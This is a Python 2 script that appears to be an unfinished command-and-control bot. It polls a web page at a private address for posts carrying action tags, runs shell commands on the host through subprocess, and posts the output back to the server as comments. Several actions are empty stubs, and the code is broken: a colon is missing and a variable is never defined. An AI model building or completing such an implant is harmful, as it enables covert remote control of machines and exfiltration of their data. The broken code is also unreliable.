import requests
import subprocess
from time import sleep
from BeautifulSoup import BeautifulSoup

URL='http://10.10.70.101'
COMPLETE_ACTIONS={}

def get_page():
    r = requests.get(URL)
    return BeautifulSoup(r._content)

def get_posts(soup):
    return soup.findAll("div", {"class": "post-post"})

def send_comment(payload):
    r = requests.post(URL + '/newcomment', data=payload)
    return r

def process_actions(posts):
    for post in posts:
        a_date = post.find("span", {"class": "post-date"}).getText()
        a_post = post.find("p", {"class": "post-body"})
        if a_date in COMPLETE_ACTIONS:
            print 'Already ran command {0}'.format(a_post)
        else:
            action = a_post.attrs("data-action",)
            if action == "shutdown-host"
                pass
            elif action == "shutdown-client":
                pass
            elif action == "get-mac":
                proc = subprocess.Popen(a_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                stdout_v = proc.stdout.read() + proc.stderr.read()
                pass
            elif action == "upload-file":
                pass
            elif action == "shell-command":
                pass
            post_id = post.find("a")['href'].split('/')[-1]
            print 'Ran command: {0}\n{1}'.format(a_command, stdout_v)
            payload = {'username': 'bot', 'body': stdout_v, 'post_id': post_id}
            status = send_comment(payload)
            print 'Status: {0}'.format(status)
            COMPLETE_ACTIONS[a_date] = a_command

while(True):
    page = get_page()
    posts = get_posts(page)
    process_actions(posts)
    sleep(30)
